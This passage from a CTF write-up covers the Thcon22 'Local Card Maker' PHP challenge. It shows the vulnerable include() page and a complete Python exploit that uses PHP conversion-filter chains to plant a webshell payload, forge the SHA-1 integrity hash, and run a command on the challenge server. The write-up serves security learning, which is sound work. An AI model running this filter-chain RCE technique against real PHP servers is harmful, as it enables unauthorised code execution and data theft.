+</span><span style=color:#fdf4c1>		</span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>"&lt;a href='/index.php?page=" </span><span style=color:#fe8019>. </span><span style=color:#fabd2f>base64_encode</span><span style=color:#fdf4c1>($p) </span><span style=color:#fe8019>.</span><span style=color:#b8bb26>"&pHash=" </span><span style=color:#fe8019>. </span><span style=color:#fdf4c1>$handler->secure_data(</span><span style=color:#fabd2f>base64_encode</span><span style=color:#fdf4c1>($p)) </span><span style=color:#fe8019>. </span><span style=color:#b8bb26>"' />&lt;li></span><span style=color:#fdf4c1>$v</span><span style=color:#b8bb26>&lt;/li>&lt;/a>"</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>	}
+</span><span style=color:#fdf4c1>}
+</span><span style=color:#fdf4c1>
+</span><span>?>
+</span><span>
+</span><span>
+</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>html</span><span style=color:#83a598>>
+</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>head</span><span style=color:#83a598>>
+</span><span>	</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>link </span><span style=color:#8ec07c>rel=</span><span style=color:#b8bb26>"stylesheet" </span><span style=color:#8ec07c>href=</span><span style=color:#b8bb26>"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"</span><span style=color:#83a598>>
+</span><span>	</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>link </span><span style=color:#8ec07c>rel=</span><span style=color:#b8bb26>"stylesheet" </span><span style=color:#8ec07c>type=</span><span style=color:#b8bb26>"text/css" </span><span style=color:#8ec07c>href=</span><span style=color:#b8bb26>"css/style.css"</span><span style=color:#83a598>>
+</span><span>	</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>meta </span><span style=color:#8ec07c>charset=</span><span style=color:#b8bb26>"utf-8"</span><span style=color:#83a598>>
+</span><span>	</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>meta </span><span style=color:#8ec07c>name=</span><span style=color:#b8bb26>"viewport" </span><span style=color:#8ec07c>content=</span><span style=color:#b8bb26>"width=device-width, initial-scale=1"</span><span style=color:#83a598>>
+</span><span>	</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>title</span><span style=color:#83a598>></span><span>Framework</span><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>title</span><span style=color:#83a598>>
+</span><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>head</span><span style=color:#83a598>>
+</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>body</span><span style=color:#83a598>>
+</span><span>	</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>div </span><span style=color:#8ec07c>class=</span><span style=color:#b8bb26>"headers"</span><span style=color:#83a598>>
+</span><span>		</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>div </span><span style=color:#8ec07c>class=</span><span style=color:#b8bb26>"inner_headers"</span><span style=color:#83a598>>
+</span><span>			</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>div </span><span style=color:#8ec07c>class=</span><span style=color:#b8bb26>"logo_c"</span><span style=color:#83a598>>
+</span><span>				</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>h1</span><span style=color:#83a598>></span><span>Thcon22</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>span</span><span style=color:#83a598>></span><span>Framework</span><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>span</span><span style=color:#83a598>>&lt;/</span><span style=color:#8ec07c;font-weight:700>h1</span><span style=color:#83a598>>
+</span><span>			</span><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>div</span><span style=color:#83a598>>
+</span><span>				</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>ul </span><span style=color:#8ec07c>class=</span><span style=color:#b8bb26>"nav"</span><span style=color:#83a598>>
+</span><span>	&lt;?php
+</span><span style=color:#fdf4c1>	createHeaders(</span><span style=color:#fabd2f>array</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'change_profile' </span><span style=color:#fe8019>=> </span><span style=color:#b8bb26>'Edit'</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>'view_profile' </span><span style=color:#fe8019>=> </span><span style=color:#b8bb26>'View'</span><span style=color:#fdf4c1>), $safe_handler);
+</span><span style=color:#fdf4c1>	</span><span>?>
+</span><span>			</span><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>ul</span><span style=color:#83a598>>
+</span><span>		</span><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>div</span><span style=color:#83a598>>
+</span><span>	</span><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>div</span><span style=color:#83a598>>
+</span><span>	</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>div </span><span style=color:#8ec07c>class=</span><span style=color:#b8bb26>"blank_space"</span><span style=color:#83a598>>&lt;/</span><span style=color:#8ec07c;font-weight:700>div</span><span style=color:#83a598>>
+</span><span>
+</span><span>	&lt;?php
+</span><span style=color:#fdf4c1>	</span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>isset</span><span style=color:#fdf4c1>($_GET[</span><span style=color:#b8bb26>'page'</span><span style=color:#fdf4c1>]) </span><span style=color:#fe8019>&& !</span><span style=color:#fabd2f>empty</span><span style=color:#fdf4c1>($_GET[</span><span style=color:#b8bb26>'page'</span><span style=color:#fdf4c1>]) </span><span style=color:#fe8019>&& </span><span style=color:#fabd2f>isset</span><span style=color:#fdf4c1>($_GET[</span><span style=color:#b8bb26>'pHash'</span><span style=color:#fdf4c1>]) </span><span style=color:#fe8019>&& !</span><span style=color:#fabd2f>empty</span><span style=color:#fdf4c1>($_GET[</span><span style=color:#b8bb26>'pHash'</span><span style=color:#fdf4c1>]))
+</span><span style=color:#fdf4c1>	{
+</span><span style=color:#fdf4c1>		$page </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_GET[</span><span style=color:#b8bb26>'page'</span><span style=color:#fdf4c1>];
+</span><span style=color:#fdf4c1>		$hash </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_GET[</span><span style=color:#b8bb26>'pHash'</span><span style=color:#fdf4c1>];
+</span><span style=color:#fdf4c1>		</span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>($safe_handler->handle($page, $hash))
+</span><span style=color:#fdf4c1>		{
+</span><span style=color:#fdf4c1>			</span><span style=color:#fa5c4b>include</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>base64_decode</span><span style=color:#fdf4c1>($page) </span><span style=color:#fe8019>. </span><span style=color:#b8bb26>'.php'</span><span style=color:#fdf4c1>);
+</span><span style=color:#fdf4c1>		}
+</span><span style=color:#fdf4c1>		</span><span style=color:#fa5c4b>else
+</span><span style=color:#fdf4c1>		{
+</span><span style=color:#fdf4c1>			</span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>"&lt;h2>Integrity verification failed...&lt;/h2>"</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>		}
+</span><span style=color:#fdf4c1>	}
+</span><span style=color:#fdf4c1>	</span><span style=color:#fa5c4b>else</span><span style=color:#fdf4c1>{
+</span><span style=color:#fdf4c1>	</span><span>?>
+</span><span>	</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>h1</span><span style=color:#83a598>></span><span>Welcome to the profile editor !</span><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>h1</span><span style=color:#83a598>>
+</span><span>	</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>p</span><span style=color:#83a598>></span><span>Here you can create and edit your profile.</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>br</span><span style=color:#83a598>></span><span> A card will be created for your Thcon22 participation.</span><span style=color:#83a598>&lt;</span><span style=color:#8ec07c;font-weight:700>br</span><span style=color:#83a598>></span><span> We hope you will like the rendering !</span><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>p</span><span style=color:#83a598>>
+</span><span>	&lt;?php
+</span><span style=color:#fdf4c1>	}
+</span><span style=color:#fdf4c1>	</span><span>?>
+</span><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>body</span><span style=color:#83a598>>
+</span><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>html</span><span style=color:#83a598>>
+</span></code></pre><p>Now we know for certain how files are loaded - <code>include(base64_decode($page) . '.php')</code>. We need to find a way to load <code>/flag.txt</code> even though <code>.php</code> is always appended.<h2 id=getting-the-flag>Getting the Flag</h2><p>When I participated in hxp CTF 2021 we faced <a href=https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/ rel=noopener target=_blank>a similar problem</a>, and I remember <a href=https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d rel=noopener target=_blank><code>loknop</code> developed a creative solution</a> using only <a href=https://www.php.net/manual/en/filters.convert.php rel=noopener target=_blank>PHP conversion filters</a> passed to <code>include()</code> to achieve <strong>RCE</strong> (which is much more than what we need here - reading file content, but will work!). I wrote the below solution to adapt the method to this challenge:<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>base64
+</span><span style=color:#fa5c4b>import </span><span>hashlib
+</span><span style=color:#fa5c4b>import </span><span>requests
+</span><span>
+</span><span style=color:#928374;font-style:italic># Based on https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d (until line 52):
+</span><span>conversions </span><span style=color:#fe8019>= </span><span>{
+</span><span>    </span><span style=color:#b8bb26>'R'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'B'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'C'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.CSISO2022KR'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'8'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'9'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'f'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'s'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'z'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'U'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'P'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'V'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'0'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'Y'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'W'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'d'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'D'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'7'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2'</span><span>,
+</span><span>    </span><span style=color:#b8bb26>'4'</span><span>: </span><span style=color:#b8bb26>'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
+</span><span>}
+</span><span>
+</span><span style=color:#928374;font-style:italic># Simple but does the trick
+</span><span>command </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"cat /flag.txt"
+</span><span>
+</span><span style=color:#928374;font-style:italic>#&lt;?=`$_GET[0]`;;?>
+</span><span>base64_payload </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"PD89YCRfR0VUWzBdYDs7Pz4"
+</span><span>
+</span><span style=color:#928374;font-style:italic># generate some garbage base64
+</span><span>filters </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"convert.iconv.UTF8.CSISO2022KR|"
+</span><span>filters </span><span style=color:#fe8019>+= </span><span style=color:#b8bb26>"convert.base64-encode|"
+</span><span style=color:#928374;font-style:italic># make sure to get rid of any equal signs in both the string we just generated and the rest of the file
+</span><span>filters </span><span style=color:#fe8019>+= </span><span style=color:#b8bb26>"convert.iconv.UTF8.UTF7|"
+</span><span>
+</span><span style=color:#fa5c4b>for </span><span>c </span><span style=color:#fa5c4b>in </span><span>base64_payload[::</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>]:
+</span><span>        filters </span><span style=color:#fe8019>+= </span><span>conversions[c] </span><span style=color:#fe8019>+ </span><span style=color:#b8bb26>"|"
+</span><span>        </span><span style=color:#928374;font-style:italic># decode and reencode to get rid of everything that isn't valid base64
+</span><span>        filters </span><span style=color:#fe8019>+= </span><span style=color:#b8bb26>"convert.base64-decode|"
+</span><span>        filters </span><span style=color:#fe8019>+= </span><span style=color:#b8bb26>"convert.base64-encode|"
+</span><span>        </span><span style=color:#928374;font-style:italic># get rid of equal signs
+</span><span>        filters </span><span style=color:#fe8019>+= </span><span style=color:#b8bb26>"convert.iconv.UTF8.UTF7|"
+</span><span>
+</span><span>filters </span><span style=color:#fe8019>+= </span><span style=color:#b8bb26>"convert.base64-decode"
+</span><span>file_to_use </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"index"
+</span><span>
+</span><span>final_payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"php://filter/</span><span>{</span><span style=color:#fdf4c1>filters</span><span>}</span><span style=color:#b8bb26>/resource=</span><span>{</span><span style=color:#fdf4c1>file_to_use</span><span>}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>.encode()
+</span><span>
+</span><span style=color:#928374;font-style:italic># "Local Card Maker"-specific implementation starts here:
+</span><span>
+</span><span>key_salt </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"Thcon_SuP3r_S3cr4t_K3y!"
+</span><span>buf </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>base64.encodebytes(final_payload).replace(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"\n"</span><span style=color:#fdf4c1>, </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>""</span><span style=color:#fdf4c1>)
+</span><span>buf_hash </span><span style=color:#fe8019>= </span><span>(</span><span style=color:#fdf4c1>hashlib.sha1(key_salt </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>buf).hexdigest()</span><span>)
+</span><span>buf </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>buf.decode()
+</span><span>
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(requests.get(</span><span style=color:#b8bb26>"http://challenges1.thcon.party:2001/index.php?page=</span><span style=color:#fdf4c1>%s</span><span style=color:#b8bb26>&pHash=</span><span style=color:#fdf4c1>%s</span><span style=color:#b8bb26>&0=</span><span style=color:#fdf4c1>%s</span><span style=color:#b8bb26>" </span><span style=color:#fe8019>% </span><span style=color:#fdf4c1>(buf, buf_hash, command)).content)
+</span></code></pre><p>The result contained the flag <code>Thcon22{_Php_&nd_Ap@che_R000ck5$$_}</code> - I guess the original solution should have used Apache? 😅</div><div class=post-tags><a class=tag href=/tags/ctf>#ctf</a><a class=tag href=/tags/exploit>#exploit</a><a class=tag href=/tags/lfi>#lfi</a><a class=tag href=/tags/php>#php</a><a class=tag href=/tags/rce>#rce</a><a class=tag href=/tags/sha-1>#sha-1</a><a class=tag href=/tags/web>#web</a></div><div class=post-nav><a class=previous href=https://guylewin.com/blog/2025-01-01-spotify-smart-playlists/><svg class=icon><use href=https://guylewin.com/icons.svg#chevronLeft></use></svg> Next Project</a><a class=next href=https://guylewin.com/blog/2022-03-02-bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi/>Previous Project <svg class=icon><use href=https://guylewin.com/icons.svg#chevronRight></use></svg></a></div></article></main><footer><hr><div id=footer-container><p>Made using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> Zola theme</div></footer><script defer src=https://guylewin.com/js/script.js></script>
